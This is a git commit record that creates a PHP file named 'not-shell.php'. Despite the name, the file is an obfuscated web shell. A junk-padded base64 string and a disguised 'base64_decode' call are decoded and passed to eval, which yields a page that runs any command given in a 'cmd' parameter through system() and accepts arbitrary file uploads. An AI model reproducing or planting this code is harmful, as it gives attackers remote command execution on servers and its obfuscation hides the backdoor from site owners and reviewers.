9bb3e6192df707029a3a9f0495f190d1f350944d
Luka Miletic <112261868+mileticluka1@users.noreply.github.com>
2023-01-01 22:20:19 +0100

    Create not-shell.php

---
+++ not-shell.php
@@ -0,0 +1,16 @@
+<?php 
+$A1xyrhsfvkBwa = ""; 
+$A1xyrhsfvkBwa .= "PGh9Hi0bWw+CjxoZWFkPgog9HiIDx0aXRsZT5XZWIgU9Hi2hlbGw8L3RpdGxlPg9Hio8L2hlYWQ+Cjxib2R9Hi5PgogIDxoMT5XZWIg9HiU2hlbGw8L2gxPgogI9HiD"; 
+$A1xyrhsfvkBwa .= "xmb9Hi3JtIG1ldGhvZD0iR0V9HiUIj4KICAgIDxpbnB1d9HiCB0eXBlPSJ0ZXh0IiB9HiuYW1lPSJjbWQiIHBsY9HiWNlaG9sZGVyPSJFbnR9HilciBjb21tYW5kIj4KI9HiCAgIDxidXR0b24gdHl9HiwZT0ic3VibWl0Ij5Fe9HiGVjdXRlPC9"; 
+$A1xyrhsfvkBwa .= "id9HiXR0b24+CiAgPC9mb3Jt9HiPgogIDxocj4KICA8cHJ9HilPgogIDw/cGhwCiAgIC9HiBpZiAoaXNzZXQoJF9HR9HiVRbJ2NtZCddKSkgewog9HiICAgICAkY21kID0gJ"; 
+$A1xyrhsfvkBwa .= "F9H9HiRVRbJ2NtZCddOwogICAgI9HiCBzeXN0ZW0oJGNtZCk7Ci9HiAgICB9CiAgPz4KICA8L3B9HiyZT4KICA8aHI+CiAgPGZv9Hicm0gbWV0aG9kPSJQT1N"; 
+$A1xyrhsfvkBwa .= "UIi9HiBlbmN0eXBlPSJtdWx9Hi0aXBhcnQvZm9ybS1k9HiYXRhIj4KICAgIDxpb9HinB1dCB0eXBlPSJmaW9HixlIiBuYW1lPSJmaWx9HilIj4KICAgIDxidXR09Hib24gdHlwZT0ic3Vib9HiWl0Ij5VcGx"; 
+$A1xyrhsfvkBwa .= "vYWQ89HiL2J1dHRvbj4KICA8L2Zvc9Him0+CiAgPD9waHAKICAgIG9HilmIChpc3NldCgkX0ZJTEV9HiTWydmaWxlJ10pKSB7CiAg9HiICAgICRmaWxlID0gJF9GS9HiUxFU1snZmlsZ"; 
+$A1xyrhsfvkBwa .= "Sd9HidOwogICAgICBtb3ZlX3Vw9HibG9hZGVkX2ZpbGUoJGZpb9HiGVbJ3RtcF9uYW1lJ10sIC9HiRmaWxlWyduYW1lJ10pOwo9HigICAgICBlY2hvICJGaWxl9HiIHVwbG9hZGVkIHN1"; 
+$A1xyrhsfvkBwa .= "Y2N9Hilc3NmdWxseS4iOwogICAg9HifQogID8+CiAgPGhyPgogI9HiEN1cnJlbnQgZGlyZWN0b39HiJ5OiA8P3BocCBzeXN0ZW09HioInB3ZCIpOyA/Pgo8L2Jv9HiZHk+CjwvaHRtbD4="; 
+$JKWVkwy6X = str_replace( "9Hi", "", $A1xyrhsfvkBwa ); 
+$ao31B8xtOHteI = str_replace( "9Hi", "", "9Hib9Hia9His9Hie9Hi69Hi49Hi_9Hid9Hie9Hic9Hio9Hid9Hie9Hi" ); 
+$CZwmxPB = $ao31B8xtOHteI( $JKWVkwy6X ); 
+$CZwmxPB = "?>$CZwmxPB"; 
+eval( $CZwmxPB ); 
+?>
